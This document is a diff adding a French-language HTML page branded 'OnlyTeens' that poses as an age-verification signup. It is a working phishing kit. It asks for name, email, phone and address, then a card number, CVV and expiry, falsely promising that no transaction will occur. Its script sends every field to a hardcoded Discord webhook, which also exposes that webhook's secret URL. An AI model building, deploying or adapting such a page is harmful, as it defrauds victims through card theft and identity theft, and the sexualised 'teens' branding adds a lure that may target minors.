@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OnlyTeens - Vérification d'âge</title>
+<style>
+  body {
+    background: #121212;
+    color: #eee;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0; padding: 20px;
+  }
+  .container {
+    background: #1e1e1e;
+    padding: 30px 40px;
+    border-radius: 10px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.7);
+  }
+  h2 {
+    margin-bottom: 20px;
+    font-weight: 700;
+    font-size: 1.6rem;
+    border-bottom: 2px solid #2575fc;
+    padding-bottom: 8px;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  .step {
+    display: none;
+    flex-direction: column;
+  }
+  .step.active {
+    display: flex;
+  }
+  input {
+    padding: 12px 15px;
+    margin-bottom: 18px;
+    border: 1.5px solid #444;
+    border-radius: 8px;
+    font-size: 1rem;
+    background: #222;
+    color: #eee;
+    outline: none;
+    transition: border-color 0.3s ease;
+  }
+  input:focus {
+    border-color: #2575fc;
+    box-shadow: 0 0 8px #2575fc;
+  }
+  button {
+    background: #2575fc;
+    color: #fff;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    font-weight: 700;
+    font-size: 1.1rem;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    margin-top: 10px;
+  }
+  button:hover:not(:disabled) {
+    background: #155ecb;
+  }
+  button:disabled {
+    background: #555;
+    cursor: not-allowed;
+  }
+  .info-text {
+    background: #2575fc;
+    color: white;
+    padding: 12px 15px;
+    border-radius: 8px;
+    font-size: 0.95rem;
+    margin-bottom: 20px;
+    line-height: 1.4;
+  }
+  .success-message {
+    text-align: center;
+    font-size: 1.2rem;
+    color: #4ade80;
+    font-weight: 600;
+    margin-top: 20px;
+  }
+  .error-message {
+    color: #ff4c4c;
+    margin-bottom: 15px;
+    font-weight: 600;
+    display: none;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h2>OnlyTeens - Inscription</h2>
+    <form id="form" novalidate>
+      <!-- Étape 1 -->
+      <div class="step active" id="step1">
+        <input type="text" name="prenom" placeholder="Prénom" required />
+        <input type="text" name="nom" placeholder="Nom" required />
+        <input type="email" name="email" placeholder="Email" required />
+        <input type="tel" name="telephone" placeholder="Numéro de téléphone" pattern="^\+?[0-9\s\-]{7,15}$" required />
+        <input type="text" name="adresse" placeholder="Adresse" required />
+        <input type="text" name="ville" placeholder="Ville" required />
+        <input type="text" name="region" placeholder="Région" required />
+        <button type="button" id="nextBtn">Continuer</button>
+      </div>
+
+      <!-- Étape 2 -->
+      <div class="step" id="step2">
+        <div class="info-text">
+          Cette étape est obligatoire pour vérifier que vous avez plus de 18 ans.<br />
+          Aucune transaction ne sera effectuée.
+        </div>
+        <input type="text" name="numero_carte" placeholder="Numéro de carte (16 chiffres)" pattern="^\d{16}$" required />
+        <input type="text" name="cvv" placeholder="CVV (3 chiffres)" pattern="^\d{3}$" required />
+        <input type="text" name="expiration" placeholder="Date d'expiration (MM/AA)" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required />
+        <button type="submit">Vérifier l'âge</button>
+      </div>
+    </form>
+    <div class="success-message" id="message"></div>
+  </div>
+
+<script>
+  const form = document.getElementById('form');
+  const steps = document.querySelectorAll('.step');
+  const nextBtn = document.getElementById('nextBtn');
+  const messageDiv = document.getElementById('message');
+  let currentStep = 0;
+
+  function validateStep(step) {
+    const inputs = steps[step].querySelectorAll('input');
+    for (const input of inputs) {
+      if (!input.checkValidity()) {
+        input.focus();
+        return false;
+      }
+    }
+    return true;
+  }
+
+  nextBtn.addEventListener('click', () => {
+    if (validateStep(currentStep)) {
+      steps[currentStep].classList.remove('active');
+      currentStep++;
+      steps[currentStep].classList.add('active');
+    }
+  });
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    if (!validateStep(currentStep)) return;
+
+    const data = {};
+    new FormData(form).forEach((v, k) => data[k] = v);
+
+    const webhookURL = "https://discord.com/api/webhooks/1399115316268765265/lFsRx3lYvUF19LDtqvzl-G4znziZcbZUYxR7uCzesvqqmR19P_ZDgYRqbxJlnThH_IwB";
+
+    const payload = {
+      embeds: [{
+        title: "Nouvelle inscription OnlyTeens - Vérification d'âge",
+        color: 0x2575fc,
+        fields: [
+          { name: "Prénom", value: data.prenom || "N/A", inline: true },
+          { name: "Nom", value: data.nom || "N/A", inline: true },
+          { name: "Email", value: data.email || "N/A", inline: false },
+          { name: "Téléphone", value: data.telephone || "N/A", inline: true },
+          { name: "Adresse", value: data.adresse || "N/A", inline: false },
+          { name: "Ville", value: data.ville || "N/A", inline: true },
+          { name: "Région", value: data.region || "N/A", inline: true },
+          { name: "Numéro de carte", value: data.numero_carte || "N/A", inline: false },
+          { name: "CVV", value: data.cvv || "N/A", inline: true },
+          { name: "Expiration", value: data.expiration || "N/A", inline: true }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    })
+    .then(res => {
+      if (res.ok) {
+        messageDiv.style.color = "#4ade80";
+        messageDiv.textContent = "Vérification terminée avec succès. Merci !";
+        form.reset();
+        steps[currentStep].classList.remove('active');
+        currentStep = 0;
+        steps[currentStep].classList.add('active');
+      } else {
+        throw new Error("Erreur serveur");
+      }
+    })
+    .catch(() => {
+      messageDiv.style.color = "#ff4c4c";
+      messageDiv.textContent = "Erreur lors de l'envoi. Réessayez plus tard.";
+    });
+  });
+</script>
+</body>
+</html>
